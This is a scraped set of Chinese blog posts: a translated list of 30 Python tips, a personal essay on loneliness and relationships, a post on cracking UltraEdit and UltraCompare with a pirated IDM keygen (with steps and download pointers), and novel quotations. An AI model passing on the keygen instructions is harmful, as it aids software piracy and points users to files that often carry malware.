python，相信看完下面 python 的实现，你会觉得编程也是一件幸福的事：） 如果你让一个 Python 程序员说一下 Python 的优势，他会说简洁以及高可读是最有影响力的优势。为证明上述两点，在这个 Python 教程里，我们将聊聊许多基本的 Python 建议和技巧。 我们从开始使用 Python 便收集这些有用的捷径（贴士与技巧）。分享一些我们知道，同时又能造福于人的知识，有什么事情比这更棒吗？ 过去我们分享过 一些 给初学者的 Python 编程贴士 旨在优化代码并且减少编码工作，我们的读者仍旧很乐意阅读它。 所以今天我们带来另一些基本的 Python 贴士与技巧，所有的这些技巧都能帮助你压缩代码并且优化运行。此外，你可以在日常工作中很容易地在真实项目中使用他们。 每一个技巧都有一个示例并且给出简短的解释，如果要测试这些代码片段，你可以看一下这些 在线虚拟 Python 运行终端。 最近我们发布的另两个必看的 Python 资源： 💡 9 种优化 Python 代码的主要方式 💡 发现在编程时应该避免的最常见的错误 给程序员的 30 个基本 Python 贴士与技巧贴士#1. 原地交换两个数字Python 提供了一个直观的在一行代码中赋值与交换（变量值）的方法，请参见下面的示例： 12345678x, y = 10, 20print(x, y)x, y = y, xprint(x, y)#1 (10, 20)#2 (20, 10) 赋值的右侧形成了一个新的元组，左侧立即解析（unpack）那个（未被引用的）元组到变量 &lt;a&gt; 和 &lt;b&gt;。 一旦赋值完成，新的元组变成了未被引用状态并且被标记为可被垃圾回收，最终也完成了变量的交换。 贴士#2. 链状比较操作符比较操作符的聚合是另一个有时很方便的技巧： 12345678910n = 10result = 1 &lt; n &lt; 20print(result)# Trueresult = 1 &gt; n &lt;= 9print(result)# False 贴士#3. 使用三元操作符来进行条件赋值三元操作符是 if-else 语句也就是条件操作符的一个快捷方式： 1[表达式为真的返回值] if [表达式] else [表达式为假的返回值] 这里给出几个你可以用来使代码紧凑简洁的例子。下面的语句是说“如果 y 是 9，给 x 赋值 10，不然赋值为 20”。如果需要的话我们也可以延长这条操作链。 1x = 10 if (y == 9) else 20 同样地，我们可以对类做这种操作： 1x = (classA if y == 1 else classB)(param1, param2) 在上面的例子里 classA 与 classB 是两个类，其中一个类的构造函数会被调用。 下面是另一个多个条件表达式链接起来用以计算最小值的例子： 12345678910def small(a, b, c): return a if a &lt;= b and a &lt;= c else (b if b &lt;= a and b &lt;= c else c)print(small(1, 0, 1))print(small(1, 2, 2))print(small(2, 2, 3))print(small(5, 4, 3))#Output#0 #1 #2 #3 我们甚至可以在列表推导中使用三元运算符： 123[m**2 if m &gt; 10 else m**4 for m in range(50)]#=&gt; [0, 1, 16, 81, 256, 625, 1296, 2401, 4096, 6561, 10000, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625, 676, 729, 784, 841, 900, 961, 1024, 1089, 1156, 1225, 1296, 1369, 1444, 1521, 1600, 1681, 1764, 1849, 1936, 2025, 2116, 2209, 2304, 2401] 贴士#4. 多行字符串基本的方式是使用源于 C 语言的反斜杠： 12345multiStr = \"select * from multi_row \\where row_id &lt; 5\"print(multiStr)# select * from multi_row where row_id &lt; 5 另一个技巧是使用三引号： 123456multiStr = \"\"\"select * from multi_row where row_id &lt; 5\"\"\"print(multiStr)#select * from multi_row #where row_id &lt; 5 上面方法共有的问题是缺少合适的缩进，如果我们尝试缩进会在字符串中插入空格。所以最后的解决方案是将字符串分为多行并且将整个字符串包含在括号中： 123456multiStr= (\"select * from multi_row \" \"where row_id &lt; 5 \" \"order by age\")print(multiStr)#select * from multi_row where row_id &lt; 5 order by age 贴士#5. 存储列表元素到新的变量中我们可以使用列表来初始化多个变量，在解析列表时，变量的数目不应该超过列表中的元素个数：【译者注：元素个数与列表长度应该严格相同，不然会报错】 123456testList = [1,2,3]x, y, z = testListprint(x, y, z)#-&gt; 1 2 3 贴士#6. 打印引入模块的文件路径如果你想知道引用到代码中模块的绝对路径，可以使用下面的技巧： 12345678import threading import socketprint(threading)print(socket)#1- &lt;module 'threading' from '/usr/lib/python2.7/threading.py'&gt;#2- &lt;module 'socket' from '/usr/lib/python2.7/socket.py'&gt; 贴士#7. 交互环境下的 “_” 操作符这是一个我们大多数人不知道的有用特性，在 Python 控制台，不论何时我们测试一个表达式或者调用一个方法，结果都会分配给一个临时变量： _（一个下划线）。 123456&gt;&gt;&gt; 2 + 13&gt;&gt;&gt; _3&gt;&gt;&gt; print _3 “_” 是上一个执行的表达式的输出。 贴士#8. 字典/集合推导与我们使用的列表推导相似，我们也可以使用字典/集合推导，它们使用起来简单且有效，下面是一个例子： 12345678testDict = &#123;i: i * i for i in xrange(10)&#125; testSet = &#123;i * 2 for i in xrange(10)&#125;print(testSet)print(testDict)#set([0, 2, 4, 6, 8, 10, 12, 14, 16, 18])#&#123;0: 0, 1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81&#125; 注：两个语句中只有一个 &lt;:&gt; 的不同，另，在 Python3 中运行上述代码时，将 &lt;xrange&gt; 改为 &lt;range&gt;。 贴士#9. 调试脚本我们可以在 &lt;pdb&gt; 模块的帮助下在 Python 脚本中设置断点，下面是一个例子： 12import pdbpdb.set_trace() 我们可以在脚本中任何位置指定 &lt;pdb.set_trace()&gt; 并且在那里设置一个断点，相当简便。 贴士#10. 开启文件分享Python 允许运行一个 HTTP 服务器来从根路径共享文件，下面是开启服务器的命令： # Python 21python -m SimpleHTTPServer # Python 31python3 -m http.server 上面的命令会在默认端口也就是 8000 开启一个服务器，你可以将一个自定义的端口号以最后一个参数的方式传递到上面的命令中。 贴士#11. 检查 Python 中的对象我们可以通过调用 dir() 方法来检查 Python 中的对象，下面是一个简单的例子： 1234test = [1, 3, 5, 7]print( dir(test) )['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort'] 贴士#12. 简化 if 语句我们可以使用下面的方式来验证多个值：1if m in [1,3,5,7]: 而不是： 1if m==1 or m==3 or m==5 or m==7: 或者，对于 in 操作符我们也可以使用 ‘{1,3,5,7}’ 而不是 ‘[1,3,5,7]’，因为 set 中取元素是 O(1) 操作。 贴士#13. 运行时检测 Python 版本当正在运行的 Python 低于支持的版本时，有时我们也许不想运行我们的程序。为达到这个目标，你可以使用下面的代码片段，它也以可读的方式输出当前 Python 版本： 12345678910import sys#Detect the Python version currently in use.if not hasattr(sys, \"hexversion\") or sys.hexversion != 50660080: print(\"Sorry, you aren't running on Python 3.5n\") print(\"Please upgrade to 3.5.n\") sys.exit(1)#Print Python version in a readable format.print(\"Current Python version: \", sys.version) 或者你可以使用 sys.version_info &gt;= (3, 5) 来替换上面代码中的 sys.hexversion != 50660080，这是一个读者的建议。 在 Python 2.7 上运行的结果： 1234567Python 2.7.10 (default, Jul 14 2015, 19:46:27)[GCC 4.8.2] on linuxSorry, you aren't running on Python 3.5Please upgrade to 3.5. 在 Python 3.5 上运行的结果： 123456Python 3.5.1 (default, Dec 2015, 13:05:11)[GCC 4.8.2] on linuxCurrent Python version: 3.5.2 (default, Aug 22 2016, 21:11:05) [GCC 5.3.0] 贴士#14. 组合多个字符串如果你想拼接列表中的所有记号，比如下面的例子： 1&gt;&gt;&gt; test = ['I', 'Like', 'Python', 'automation'] 现在，让我们从上面给出的列表元素新建一个字符串：1&gt;&gt;&gt; print ''.join(test) 贴士#15. 四种翻转字符串/列表的方式# 翻转列表本身12345testList = [1, 3, 5]testList.reverse()print(testList)#-&gt; [5, 3, 1] # 在一个循环中翻转并迭代输出123456for element in reversed([1,3,5]): print(element)#1-&gt; 5#2-&gt; 3#3-&gt; 1 # 一行代码翻转字符串1\"Test Python\"[::-1] 输出为 “nohtyP tseT” # 使用切片翻转列表1[1, 3, 5][::-1] 上面的命令将会给出输出 [5,3,1]。 #贴士#16. 玩转枚举使用枚举可以在循环中方便地找到（当前的）索引： 1234567testlist = [10, 20, 30]for i, value in enumerate(testlist): print(i, ': ', value)#1-&gt; 0 : 10#2-&gt; 1 : 20#3-&gt; 2 : 30 贴士#17. 在 Python 中使用枚举量我们可以使用下面的方式来定义枚举量： 123456789101112class Shapes: Circle, Square, Triangle, Quadrangle = range(4)print(Shapes.Circle)print(Shapes.Square)print(Shapes.Triangle)print(Shapes.Quadrangle)#1-&gt; 0#2-&gt; 1#3-&gt; 2#4-&gt; 3 贴士#18. 从方法中返回多个值并没有太多编程语言支持这个特性，然而 Python 中的方法确实（可以）返回多个值，请参见下面的例子来看看这是如何工作的： 12345678910# function returning multiple values.def x(): return 1, 2, 3, 4# Calling the above function.a, b, c, d = x()print(a, b, c, d)#-&gt; 1 2 3 4 贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数 运算符（splat operator）提供了一个艺术化的方法来 unpack 参数列表，为清楚起见请参见下面的例子：12345678910111213def test(x, y, z): print(x, y, z)testDict = &#123;'x': 1, 'y': 2, 'z': 3&#125; testList = [10, 20, 30]test(*testDict)test(**testDict)test(*testList)#1-&gt; x y z#2-&gt; 1 2 3#3-&gt; 10 20 30 贴士#20. 使用字典来存储选择操作我们能构造一个字典来存储表达式：1234567stdcalc = &#123; 'sum': lambda x, y: x + y, 'subtract': lambda x, y: x - y&#125;print(stdcalc['sum'](9,3))print(stdcalc['subtract'](9,3)) 贴士#21. 一行代码计算任何数的阶乘Python 2.x.1234result = (lambda k: reduce(int.__mul__, range(1,k+1),1))(3)print(result)#-&gt; 6 Python 3.x.12345import functoolsresult = (lambda k: functools.reduce(int.__mul__, range(1,k+1),1))(3)print(result)#-&gt; 6 贴士#22. 找到列表中出现最频繁的数1234test = [1,2,3,4,2,2,3,1,4,4,4]print(max(set(test), key=test.count))#-&gt; 4 贴士#23. 重置递归限制Python 限制递归次数到 1000，我们可以重置这个值： 12345678910import sysx=1001print(sys.getrecursionlimit())sys.setrecursionlimit(x)print(sys.getrecursionlimit())#-&gt; 1000#-&gt; 1001 请只在必要的时候采用上面的技巧。 贴士#24. 检查一个对象的内存使用在 Python 2.7 中，一个 32 比特的整数占用 24 字节，在 Python 3.5 中占用 28 字节。为确定内存使用，我们可以调用 getsizeof 方法： 在 Python 2.7 中 12345import sysx=1print(sys.getsizeof(x))#-&gt; 24 在 Python 3.5 中 12345import sysx=1print(sys.getsizeof(x))#-&gt; 28 贴士#25. 使用 slots 来减少内存开支你是否注意到你的 Python 应用占用许多资源特别是内存？有一个技巧是使用 slots 类变量来在一定程度上减少内存开支。 1234567891011121314151617181920212223242526import sysclass FileSystem(object): def __init__(self, files, folders, devices): self.files = files self.folders = folders self.devices = devicesprint(sys.getsizeof( FileSystem ))class FileSystem1(object): __slots__ = ['files', 'folders', 'devices'] def __init__(self, files, folders, devices): self.files = files self.folders = folders self.devices = devicesprint(sys.getsizeof( FileSystem1 ))#In Python 3.5#1-&gt; 1016#2-&gt; 888# 经测试 在我的 win10 python27 中跑出的结果是：#1-&gt; 452#2-&gt; 512 很明显，你可以从结果中看到确实有内存使用上的节省，但是你只应该在一个类的内存开销不必要得大时才使用 slots。只在对应用进行性能分析后才使用它，不然地话，你只是使得代码难以改变而没有真正的益处。 所以，这种比较方式是不那么让人信服的，使用 slots 主要是用以限定对象的属性信息，另外，当生成对象很多时花销可能会小一些，具体可以参见 python 官方文档: The slots declaration takes a sequence of instance variables and reserves just enough space in each instance to hold a value for each variable. Space is saved because dict is not created for each instance. 也可参考廖雪峰老师的 使用slots 贴士#26. 使用 lambda 来模仿输出方法12345import syslprint=lambda *args:sys.stdout.write(\" \".join(map(str,args)))lprint(\"python\", \"tips\",1000,1001)#-&gt; python tips 1000 1001 贴士#27. 从两个相关的序列构建一个字典123456t1 = (1, 2, 3)t2 = (10, 20, 30)print(dict (zip(t1,t2)))#-&gt; &#123;1: 10, 2: 20, 3: 30&#125; 贴士#28. 一行代码搜索字符串的多个前后缀12345print(\"http://www.google.com\".startswith((\"http://\", \"https://\")))print(\"http://www.google.co.uk\".endswith((\".com\", \".co.uk\")))#1-&gt; True#2-&gt; True 贴士#29. 不使用循环构造一个列表12345import itertoolstest = [[-1, -2], [30, 40], [25, 35]]print(list(itertools.chain.from_iterable(test)))#-&gt; [-1, -2, 30, 40, 25, 35] 贴士#30. 在 Python 中实现一个真正的 switch-case 语句下面的代码使用一个字典来模拟构造一个 switch-case。 12345678910def xswitch(x): return xswitch._system_dict.get(x, None)xswitch._system_dict = &#123;'files': 10, 'folders': 5, 'devices': 2&#125;print(xswitch('default'))print(xswitch('devices'))#1-&gt; None#2-&gt; 2 结语 – 给程序员的基本 Python 贴士与技巧 我们希望上述的基本的 Python 贴士与技巧可以帮助你快速地 &amp; 有效地完成任务，你可以在作业与项目中使用他们。 听从你的回馈会使我们变得更好，所以请分享你的想法。 你甚至可以要求我们写一个你选择的话题，我们会将其加入到我们的写作列表中。【*】 最后，如果你喜欢这个文章，请在社交媒体上分享给你的朋友。 坚持学习， TechBeamers. 本文由 伯乐在线 - 阿喵 翻译，艾凌风 校稿。英文出处：Meenakshi Agarwal。","tags":[{"name":"python","slug":"python","permalink":"http://ev1l.cn/tags/python/"}]},{"title":"一次反人类的自我对话","date":"2017-04-12T17:19:49.000Z","path":"2017/04/13/jitang_gudu/","text":"前几天工作的压力还是蛮大的，好在只要是你想解决，问题总归是会解决的。这段日子算是难得地小憩了一下。与外界断了联系，每天跑跑步，健健身，不太靠谱的注意下自己的饮食，听听音乐，看看电影，有一集没一集的追追美剧，不紧不慢的上下班，看看牛人写的鸡汤(《黑客与画家》)。跳出到紧张的节奏之外（其实闲下来感觉还是蛮紧张的……），也算是享受享受孤独，还是很惬意。 鸡汤《黑客与画家》没读这本书之前，不知道里面讲的到底是什么。单是书名，就够我浮想联翩一下午的了。原因吗？ 我对黑客有种特殊的感情。会画画的女孩很迷人。 第一点么，感情酝酿到位了，资料也准备到位了，然而行动就……打自己脸的事情先跳过吧，有缘再讲……至于第二点么，会画画的女孩很迷人。会画画的女孩总是不缺少一双发现美的眼睛，做事也不缺少条理性。前前后后，遇见过3个会画画的女孩子。但我的初恋也是我的前任的她却不会…… 与初恋在初中相识。与X在高中相识。与Y在大学相识。与Z在工作后通过Internet相识。 我的人生还是蛮幸运的，在不同的阶段，都遇到了那些优秀又迷人的女孩子。即使相隔万里，也真诚的祝福你们过得快乐。我这种天性孤独的人，确实比较适合在四下无人的夜里，默默的凝望着繁星送上一句想念就好。 《黑客与画家》这本书呢，是硅谷创业之父的文集，多记载了个人对某些事物见解，而不是技术类书籍。 是一本翻开看内容时不停的刷新我的某些认知并折磨着脑细胞的书。建议有脑子的人都读一读。 孤独感谢那些从你生命中消失的人如果一定要对他们说句话，我其实想说谢谢。无论我们当初怎么相识，又因何故分离，感谢你们当初的陪伴，也谢谢你们最后把时间还给了我。 时间是我们的一生中唯一一个避不开的东西，无论我今天是什么样子，都是已经过去的每一分每一秒换来的。这段时间里，我正在努力的变得更优秀一点，也期盼着遇见像当初的你们于当初的我来讲那样优秀迷人的人。 我总是乐于承认自己不够优秀，也偶尔会被同样不够优秀的人拉住衣角问“你已经很好了，为什么还不知足？”停不下来也许是心虚吧，怕遇见更好的你，却不是配得上更好的你的自己。 拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。举几个例子 你害怕孤独，同时你喜欢一个人，但是你并没有优秀到对方可以凝望着你的脸庞眼神中充满了迷恋说出喜欢你的地步，你该怎么做？是选择一个喜欢你的人？还是让你喜欢的人也喜欢上你？ 你害怕孤独，在你喜欢的和喜欢你的之间，你选择了后者。后者为了让你喜欢上自己不停的在努力。随着时间的推移，你如何保证在这个从未停止转动的世界里，喜欢你的人不会遇到比你更优秀的人？而对方又如何寄希望与你，让对方相信选择你是正确的，你对对方来说永远都是哪个特别的人？ 你害怕孤独，你相信如果跟一个优秀的人在一起，一定会努力变成一个对他来说既特别又迷人的人。可优秀的人为什么要跟一个一眼就能从20岁看到70岁的人在一起？若你保证一定会为了对方也努力变成优秀的人，优秀的人时间成本很高，对方如何相信你有这样的能力以至于最后不是在浪费时间？ 孤独与时间时间是唯一避不开的东西，而孤独与时间的组合可能是让你成长的最好的条件。 我们做什么事情都要花时间，谈恋爱，逛街，旅行，与朋友聊天，学习，健身，玩手机，发呆，睡觉，培养感情等等。这么多的事情把我们每天的时间挤得满满的。父母担心打扰到你以至于每天9点以后才敢小心翼翼的打个电话问你是不是在忙，而你总是用一会还有事为理由挂断电话，但是接电话之前你却花了一个多小时刷微博，花了几十分钟在微信上跟没见过面的人从天涯聊到了海角，从海角聊到了海角七号。 孤独是什么，孤独也许是你抛弃了上面的一部分事情后，因为时间处于空档而产生的感觉。那孤独带来了什么？孤独带来了时间，时间的长短取决于你抛弃的事情会占用你多少时间，你抛弃的越多，你的待分配时间越多，相应的，你就会越孤独。 孤独给了你重新分配时间的机会，让你有机会把时间分配到更应该分配的事情上面。若你想谈恋爱，就把和朋友聊天的时间尽量压缩，很多人奇怪，为什么这么说，朋友难道不重要吗？如果你想每天都沉浸在人际交往里，我不反对你保持与朋友聊天这个习惯，如果你想谈了恋爱以后因没有时间提升自身而一直毫无进步，我也不反对。 若你把时间用在对未来有帮助的地方，我相信你自己会感谢你自己的，别着急。 做一个The One别相信年轻人的花言巧语，他们在甩你的时候跟当初决定在一起的时候抱着相同的决心。决定跟你在一起时对周围的人不削一顾，决定跟别人在一起的时候，你也一样会被不削一顾。硬要说有所区别，可能是你比其他的那些被不削一顾的人更让人讨厌吧。 之前跟他人说起过，两个人在一起的根本原因是吸引。在一起的过程类似于你刚买了一个新的ipad，若ipad内的app一成不变，app的内容也一成不变，等你全看过了，也就不再那么感兴趣了，这时如果别人有一个新的ipad，里面的app也都是新的，我不确定所有人都能在有机会接触的情况下不去玩一玩新的。至少读这篇文章的你会忍不住。 两个人想一直在一起，双方都应该是那个既吸引着对方又对对方来说是最特别的那个人。 这个世界，优秀的人有很多，你不知道你喜欢的人有哪一点也吸引着这些人。而相比之下，你吸引人的那一点不一定比这些人迷人，即使是那一点同样吸引人，但是其他点你也很可能比不上他们。 若你每天在心里念叨着喜欢着那个人，但是你却未曾让自己变得更优秀，相信我，下辈子对方也不会回头看你一眼。在你停在原地的情况下，对方唯一可能喜欢你的机会是第一次遇见你时，那时的你在对方的心目中是最好的样子，不管是出丑还是擦肩都一样。而你已经失去这次机会了。若你明知如此，还是不努力，也还是念叨着喜欢对方，对不起，不光是你喜欢的人，你的朋友也会相继离开你。 试着做一个在对方眼里的 The One 也许你已经自然而然的成功了：） 可替代性强的你，若是被抛弃了，不必伤心，本该如此的。 朋友你懂得这个世界总是拿价值去衡量一切，周围的人会不自觉的给你打上标签，来表明你是否有价值。读书的时候会看成绩，毕业了以后看薪资。你有幸得到了一群朋友，他们不计较你的标签，他们很真诚的与你交流。你感到心里很温暖，觉得这真是上天给你的礼物。你很珍惜他们。但是你却不曾想过为他们创造什么价值。 若你仔细想想，因为他们是你的朋友，你应该为他们产生更多的价值，而不是每天喊着有你真好。喊三遍以后，可能就不太灵了。你的朋友同样也会结识另一部分朋友，人的时间是有限的，若有些人能比你为他做的更多，而你除了先认识那个人以外毫无优势的话……可能更可怕的是你连时间优势都没有……所以你曾经的一部分朋友离开了你。我不想说的这么现实，但是事实就是如此。 那若我们现阶段无法创造直观的价值也不想就这样错过机会怎么办？这个问题跟创业公司找投资人拉投资是一样的——画饼。对准投资人感兴趣的点，让对方看见你现在的状态，你需要的是什么，你的规划，你的行动力以及你的潜力。若你是投资人，前两种大部分人刚创业的人都差不多，而决定了对方能否给你信任的是你的规划，你的行动力和你的潜力。嗯，投资人是否感兴趣才是最后要特别提出来的，你再好没兴趣也不会有结果。 是的，即使你天真到不愿相信这种复杂的感情能被量化到用另一种理念来代替，但总会有离开的人拎着棒子打醒你，告诉你你对他已经没有用了。 若你的朋友进步很快，你还停在原地，你又想跟他们做朋友，若在对方眼里没有你对他有比山还高的恩情，你可能只有变得越来越优秀能互相创造更多的价值这一种途径了。 不要和那些连看好你什么都不知道的人做朋友，因为你同样不知道对方离开的原因到底是什么。 异性铁哥们如果是我的异性铁哥们，我把所有的机会都给她去变得更迷人，让她在找到更好的人的路上，偶尔聊个天，关心一下，有时间大家一起出去疯一疯，异性铁哥们虽然类似同性铁哥们，但还是有区别的，伪娘都跟闺蜜擦枪走火了，你还能相信谁？ 就在那个被酒杯里的酒摇晃着的夜晚，就在又喝了一杯酒低头用力的咽下去又抬起头的那一刻，就那一瞬间，就那一眼望向你，就那头小鹿突然脚抽筋没站稳撞了下你铁哥们左心房……后面你脑补能力应该不比我差：） 那些打算找个男女朋友的同时，还跟另一个异性打着铁哥们旗号，两个人满世界high的人，拜托省省吧。你最后会发现，你并不需要男女朋友，除非你只是想找个牵手打kiss开房的人，而铁哥们你不敢这样做（不然这个铁哥们也变成你的男女朋友了）。 你思考了一下，觉得不应该用铁哥们做不到的事为目的来找男女朋友，应该是男女朋友做，如果男女朋友做不到的，铁哥们做。比如男女朋友陪着你满世界high，一个人没意思了，男女朋友又在忙，就去找铁哥们high。问题来了，这样的定义，跟备胎差多少呢？你们的感情离其中一个人终于不敢寂寞还差多远呢？你的铁哥们这么陪着你high，你究竟浪费了他多少的青春呢？他把这些时间用在提升自己和自己的男女朋友身上，会不会让自己的感情状态更稳定，让自己更吸引人呢？你这么无视他人的时间，是不是有点自私？对方嘴上说着好啊好啊陪着你到处疯，难道真的不是因为喜欢你却又说不出口？ 难道真的不是潜意识里觉得陪伴才是最长情的告白？ 你说你了解你哥们，不会的，人家就是很闲。你确定他没有因为你推掉了之前安排好的时间？而青春这个债，你最后要怎么还？ 最后一句，对不起？谢谢？ 你又思考了一下，觉得我这个人有病。你能看到这，可能你也得吃点药。","tags":[{"name":"Leo","slug":"Leo","permalink":"http://ev1l.cn/tags/Leo/"}]},{"title":"UltraEdit、UltraCompare 等IDM产品注册机","date":"2017-02-10T10:20:07.000Z","path":"2017/02/10/UltraEdit_crack/","text":"注册机：IDM All Products KeyGen v3.6使用时间：2017-2-10注册产品：UltraEdit 23.20.0.43、UltraCompare 16.00.0.50 注册过程 官网或者百度软件中心下载最新版本的UltraEdit -&gt; 重新打开软件 -&gt; 断网（随便输入用户）激活 -&gt; 在注册机中选择对应软件并复制code1、code2 至注册机对应输入框后点击Generate -&gt; 把生成代码粘贴至软件相应输入框中 -&gt; 提交 下载方式 下载地址 备注 翻墙党 IDM All Products KeyGen v3.6 (填写邮箱，提交请求后会把下载链接发到你的邮箱中。) 墙内党-百度云 IDM All Products KeyGen v3.6 (提取码：2sas)","tags":[{"name":"工具","slug":"工具","permalink":"http://ev1l.cn/tags/工具/"}]},{"title":"昭奚旧草  2016-12-26","date":"2016-12-25T22:31:20.000Z","path":"2016/12/26/zhaoxijiucao/","text":"“他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。” 一夜未眠，伴着音乐工作，忽然放到这首音乐，把我从一块块代码中拉到了另一个世界。 可能是现实生活的稀松平常会让一个人无法抵抗逃离现实的诱惑，将自己置身于那个俯身便可阅尽众生轮回的世界，停泊在泼墨笔尖。 “有怪踩月而来，美如秋水，清如山河，生呆若木鸡，爱而不能忍，甚倾之。” 爱到何处，已不能忍受咫尺之距。甚倾之。生甚倾之。 从不知相思，安知相思死。 “我与梦中的小小姑娘说，等她长大了，便带她去看悬崖上的红花、海底的白珠，欢喜她欢喜到打仗吃酒读书抚琴都忍不住带到身边，山高水长过一辈子。”“然后呢？”“然后，她死在了长大嫁人的那一日。” 他让她住在他的心上，走到哪里便带到哪里，记忆有多久，她便有多么长寿。 但凡人命，皆由天意妄肆而定，我不入红尘，此生不驯。 我也曾备下三十三城嫁妆，预备嫁我价值连城的掌珠。 “奚山，什么是命？”“就是任你万念俱灰死而复生，日夜不停绝望哭泣，也依旧拿它没有办法的东西啊。得不到的就是得不到，那样东西卑鄙地诱惑着你，背对着你却几乎笑得喘不过气，它对所有有资格得到它的人共享欢愉，共分秘密，一同看戏，看着你，而后转头告诉那些人，瞧，那个小傻子，也妄想得到我呢。” 她欢喜他，叶公好龙，他爱着她，尾生抱柱。 我只是想再瞧你一瞧，我怕再也瞧你不到。 更始十九年一个夏日的清晨，我卜了一卦，卦象安宁，说你还在。这一卦是我人生中唯一一次错了。卦象如此平静，除了可能是你一直活着，还有一种可能——你已不在很久。 君当如何，妾当如何。君是乱臣，妾做贼子。 三娘低声道：“我与山君不同。我喜欢的人若是也喜欢我，便只能喜欢我一人。哪怕他喜欢旁的女子只是一时一日，我也断然不会让他好受。他喜欢我不能是最喜欢，更不能只是浅浅的喜欢，最喜欢时还有次喜欢，浅浅喜欢我那深深喜欢又给了谁？他只能喜欢我。” 我长不大了，却在变老。时间是永恒的，我却在消耗。没有人知道我在等什么，我也不必让他们知道。他们看到我是笑着的，可是我难过的时候除了不停呼吸，已经蠢到不知道该干什么。你若了解苍穹之宽阔，便明白我抬头仰望时的悲渺。仿佛我生下来就是这样孤零零的，仿佛到现在，我还是这一个我。 没有瞧见她的时候，天下倒还是个天下的模样，她死了，天下变成了一桩桩琐事。 从此我活着仅仅是为了熬完最后的日子，不管二十岁还是六十岁。 君心何坚决，到死无两意。 他一直等着，待到下辈子，他与她不亏不欠了，便莫要欢喜过甚，钟情过疾，骄傲过命，只是结个良缘，也能好聚好散。 打散的，寂寞之徒；忘却的，年岁偶驻。 我的爱比别人廉价，满了便溢，没什么可惜。因我知终有一日，它还会满。 那是她失去了许久的东西，这世上再无人知道了，可只有她，一直这样艰难地铭记着。哪怕失去了味觉，失去了感情， 变成了一粒草籽，一片乌云，也钻心刺骨地无法忘记。 她这样深切痛苦地思念着他，是思念教她走到今日。 我得宠溺他一生一世，做个他，像他待我那一辈子。惟愿他，此生便是那个前世懵懂的我，被钟爱，被安排。虽则天常有不测风云。 我也曾想，我若为天，该有多好，定善待他终生。 我若为天，他的磨难中总存一线希望，痛苦中还有转圜。这世上神话故事颇多，每一桩，都是我来演。我来做山，做海，做泥荷，做蝼蚁，苍天有束光可偷，我也偷来，予他做个冠带。你何必惊讶他竟不能处处识得我，也不必知道，这样的强制安排不是为了满足我的爱，而是为了想要他还能笑出来。 “须知万物皆有少年早衰之时，焉知我便强过谁？”“你是我的妻子，自然强过这世间千千万。” 她知道他必定曾经在很遥远很遥远的时候，抱她入怀，那样珍重，那样怜爱。那或许是他们的前世，只有她记得的前世 。人说讲虚妄之事是因无知，只有忍冬知道，她划定了一个虚无的前世，只是因为太想得到。 她说：“我就此消失，祈求奚山君夺去我在你脑海中的记忆，这样，你此生，便可如高岭之雪，不受玷污，成为第一等诸侯，得到第一等封邑，娶得第一等娇妻，福寿双全。”风起云涌，屏风渐渐随着风化，屏风内的那张干净的面庞也随着屏风一寸寸变成沙尘。 她说：“谢良辰，我知道你觉得我配不上你，不该奢望。可是，你何曾配得上过我那样的喜欢？故而，打从今天，从这一刻钟，从我们初初见面的那一眼，从夏虫鸣了，桃花散了，竹叶青了的时候算起，我们两不相欠。” 本是深闺梦中人，日头月头霞光雾霰万象变幻，自哂自嘲自污自怨不自量力，不过是，怕人听见。 你怨我欢喜得卑鄙，欢喜得浅薄，可是你前生，又爱我到如何，才教我今生从头清算，迎头一棒，鲜血淋漓，这样去还。 她死的那一日，天上飞来许多雀鸟，那鸟儿眼瞧着就要自由。他让人打落了所有的鸟儿，葬在她的坟前，祭奠她此生可贵的自由，他此生卑微的囚途。 百国男子老老少少，我瞧见谁，一错眼一恍惚，便总是隐约觉得他们五官血脉中或多或少都有一丝一毫像着你，他们并不是你，我寻不到你，可他们像你。 爱太执着，恨太浓烈，她旧时候都尝过，可待到来年，它们就长成了遗憾。旧时景色，旧时人情，旧时琳琅，旧时凋零。满目疮痍，不忍目睹。 人世本就是一场游戏，你若已然输了，便不要再让对手赢了。成全没有任何意义，成全让恨意滋生，爱自己是活着的唯一意义，灰烬之后，才是田园斜径，白云出岫。 我想死到山涧，天地之间无人寻到，连鸟兽都不去的地方。这样尸体就能慢慢腐烂消散，不用与这来去都匆匆的人生一般。听闻骨头化得慢一些，可以慢慢等，等到灵魂都变成这空气的一部分，便能融入这世间，同这世间一般污浊了。到时候，再也没有人，为了求取我拥有的最后一样东西，而哄骗我，同我说这世间存有许多真情的假话了。 卧夜坐起风雨，推窗广厦明烛。天也有十分心愿，宁可千万人顺心如意。到头来，磨难重重；换一人，白首不离。 我有没有告诉过你，你是我看过最好看的男子？就算有人比你好看，可那也与我没什么相干。我说我讨厌你的时候，其实在想，这样待你是讨厌你，等我控制不住，待你再好一些的时候，你便不会再惧怕我，只会觉得我只是从讨厌你变成喜欢你罢了。 而非，从深深喜欢你到深深爱慕你。 大昭明珠生得极美，他带着千方百计，阴谋阳策，堪堪呼喝随身内侍扶正发间的那顶珠冠，也只是一垂头，含笑落泪。再抬起头，已是一目千里。可是他还是来不及，好好地，好好看她一眼。 火焰从翠衣人的脚边慢慢蹿起，天上却浮现了明亮的霞光。男子眼中无情无欲，只剩下悲悯。他临风而立，狂风吹起翠色的长袖。他说：“既已如此，三娘，莫再回头。你我夫妻缘尽，你莫回头瞧我，我亦不再瞧你。我入仙道，你入轮回，你我，再无相见，再无回头之日。” 